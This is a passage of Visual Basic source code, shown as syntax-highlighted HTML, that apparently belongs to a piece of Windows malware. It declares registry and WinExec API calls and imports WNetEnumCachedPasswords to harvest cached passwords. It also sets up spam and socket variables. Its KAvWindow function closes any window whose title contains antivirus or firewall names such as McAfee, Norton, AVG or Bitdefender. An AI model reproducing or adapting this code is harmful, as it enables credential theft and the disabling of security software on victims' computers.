
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Const</span><span class="sc0"> </span><span class="sc7">CONNECT_UPDATE_PROFILE</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">&amp;H1</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">WritePrivateProfileString</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"kernel32"</span><span class="sc0"> </span><span class="sc3">Alias</span><span class="sc0"> </span><span class="sc4">"WritePrivateProfileStringA"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">lpApplicationName</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">lpKeyName</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc7">Any</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">lpString</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc7">Any</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">lpFileName</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">GetVersionExA</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"kernel32"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">lpVersionInformation</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc7">OSVERSIONINFO</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Integer</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Type</span><span class="sc0"> </span><span class="sc7">OSVERSIONINFO</span><span class="sc0">
  </span><span class="sc7">dwOSVersionInfoSize</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
  </span><span class="sc7">dwMajorVersion</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
  </span><span class="sc7">dwMinorVersion</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
  </span><span class="sc7">dwBuildNumber</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
  </span><span class="sc7">dwPlatformId</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
  </span><span class="sc7">szCSDVersion</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0"> </span><span class="sc6">*</span><span class="sc0"> </span><span class="sc2">128</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Type</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">MemCopy</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"kernel32"</span><span class="sc0"> </span><span class="sc3">Alias</span><span class="sc0"> </span><span class="sc4">"RtlMoveMemory"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">Dest</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc7">Any</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">Src</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">cb&amp;</span><span class="sc6">)</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">GetSystemDirectory</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"kernel32"</span><span class="sc0"> </span><span class="sc3">Alias</span><span class="sc0"> </span><span class="sc4">"GetSystemDirectoryA"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">lpBuffer</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">nSize</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">GetWindowsDirectory</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"kernel32"</span><span class="sc0"> </span><span class="sc3">Alias</span><span class="sc0"> </span><span class="sc4">"GetWindowsDirectoryA"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">lpBuffer</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">nSize</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">GetTempPath</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"kernel32"</span><span class="sc0"> </span><span class="sc3">Alias</span><span class="sc0"> </span><span class="sc4">"GetTempPathA"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">nBufferLength</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">lpBuffer</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">RegOpenKeyEx</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"advapi32.dll"</span><span class="sc0"> </span><span class="sc3">Alias</span><span class="sc0"> </span><span class="sc4">"RegOpenKeyExA"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">hKey</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">lpSubKey</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">ulOptions</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">samDesired</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">phkResult</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">RegQueryValueEx</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"advapi32.dll"</span><span class="sc0"> </span><span class="sc3">Alias</span><span class="sc0"> </span><span class="sc4">"RegQueryValueExA"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">hKey</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">lpValueName</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">lpReserved</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">lpType</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">lpData</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc7">Any</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">lpcbData</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">RegCloseKey</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"advapi32.dll"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">hKey</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">RegSetValueEx</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"advapi32.dll"</span><span class="sc0"> </span><span class="sc3">Alias</span><span class="sc0"> </span><span class="sc4">"RegSetValueExA"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">hKey</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">lpValueName</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">Reserved</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">dwType</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">lpData</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc7">Any</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">cbData</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">RegCreateKeyEx</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"advapi32.dll"</span><span class="sc0"> </span><span class="sc3">Alias</span><span class="sc0"> </span><span class="sc4">"RegCreateKeyExA"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">hKey</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">lpSubKey</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">Reserved</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">lpClass</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">dwOptions</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">samDesired</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">lpSecurityAttributes</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">phkResult</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">lpdwDisposition</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">RegDeleteValue</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"advapi32.dll"</span><span class="sc0"> </span><span class="sc3">Alias</span><span class="sc0"> </span><span class="sc4">"RegDeleteValueA"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">hKey</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">lpValueName</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Const</span><span class="sc0"> </span><span class="sc7">REG_SZ</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Const</span><span class="sc0"> </span><span class="sc7">REG_EXPAND_SZ</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Const</span><span class="sc0"> </span><span class="sc7">REG_DWORD</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Const</span><span class="sc0"> </span><span class="sc7">KEY_ALL_ACCESS</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">&amp;H3F</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Const</span><span class="sc0"> </span><span class="sc7">REG_OPTION_NON_VOLATILE</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Const</span><span class="sc0"> </span><span class="sc7">HKEY_CLASSES_ROOT</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">&amp;H80000000</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Const</span><span class="sc0"> </span><span class="sc7">HKEY_CURRENT_USER</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">&amp;H80000001</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Const</span><span class="sc0"> </span><span class="sc7">HKEY_LOCAL_MACHINE</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">&amp;H80000002</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Const</span><span class="sc0"> </span><span class="sc7">KEY_QUERY_VALUE</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">&amp;H1</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">WinExec</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"kernel32"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">lpCmdLine</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">nCmdShow</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Const</span><span class="sc0"> </span><span class="sc7">SW_NORMAL</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">WNetEnumCachedPasswords</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"mpr.dll"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">i</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Integer</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">b</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Byte</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">proc</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">l</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Type</span><span class="sc0"> </span><span class="sc7">PASWORD_TYPE</span><span class="sc0">
  </span><span class="sc7">Eintrag</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Integer</span><span class="sc0">
  </span><span class="sc7">Quelle</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Integer</span><span class="sc0">
  </span><span class="sc7">Pasword</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Integer</span><span class="sc0">
  </span><span class="sc7">i</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Byte</span><span class="sc0">
  </span><span class="sc7">nT</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Byte</span><span class="sc0">
  </span><span class="sc7">Feld</span><span class="sc6">(</span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">To</span><span class="sc0"> </span><span class="sc2">1024</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Byte</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Type</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc7">Sey1</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Sey2</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Sey3</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">StrPass</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">
</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc7">spam</span><span class="sc6">(</span><span class="sc2">30</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc7">mysock</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Progress</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Integer</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">do_cancel</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Boolean</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">rtncode</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Integer</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">KAvWindow</span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">hWnd</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">lParam</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Boolean</span><span class="sc0">
</span><span class="sc1">'OK
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">

</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">WinTitle</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">l</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">

</span><span class="sc7">av</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Array</span><span class="sc6">(</span><span class="sc4">"scan"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"virus"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"trojan"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"panda"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"troyan"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"remover"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
</span><span class="sc4">"mcafee"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"firewall"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"bitdefender"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"security"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"norton"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"cleaner"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
</span><span class="sc4">"norman"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"the hacker"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"thav"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"avp"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"symantec"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"shopos"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"avg"</span><span class="sc6">)</span><span class="sc0">

</span><span class="sc7">DoEvents</span><span class="sc0">

</span><span class="sc7">WinTitle</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Space$</span><span class="sc6">(</span><span class="sc2">255</span><span class="sc6">)</span><span class="sc0">

</span><span class="sc7">l</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">GetWindowText</span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">hWnd</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">WinTitle</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">Len</span><span class="sc6">(</span><span class="sc7">WinTitle</span><span class="sc6">))</span><span class="sc0">
</span><span class="sc7">WinTitle</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Left$</span><span class="sc6">(</span><span class="sc7">WinTitle</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">l</span><span class="sc6">)</span><span class="sc0">

</span><span class="sc3">For</span><span class="sc0"> </span><span class="sc7">i</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">To</span><span class="sc0"> </span><span class="sc7">UBound</span><span class="sc6">(</span><span class="sc7">av</span><span class="sc6">)</span><span class="sc0">

</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">InStr</span><span class="sc6">(</span><span class="sc7">LCase</span><span class="sc6">(</span><span class="sc7">WinTitle</span><span class="sc6">),</span><span class="sc0"> </span><span class="sc7">av</span><span class="sc6">(</span><span class="sc7">i</span><span class="sc6">))</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">PostMessage</span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">hWnd</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">WM_CLOSE</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">vbNull</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">vbNull</span><span class="sc6">)</span><span class="sc0">

</span><span class="sc3">Next</span><span class="sc0">
    
</span><span class="sc7">KAvWindow</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">

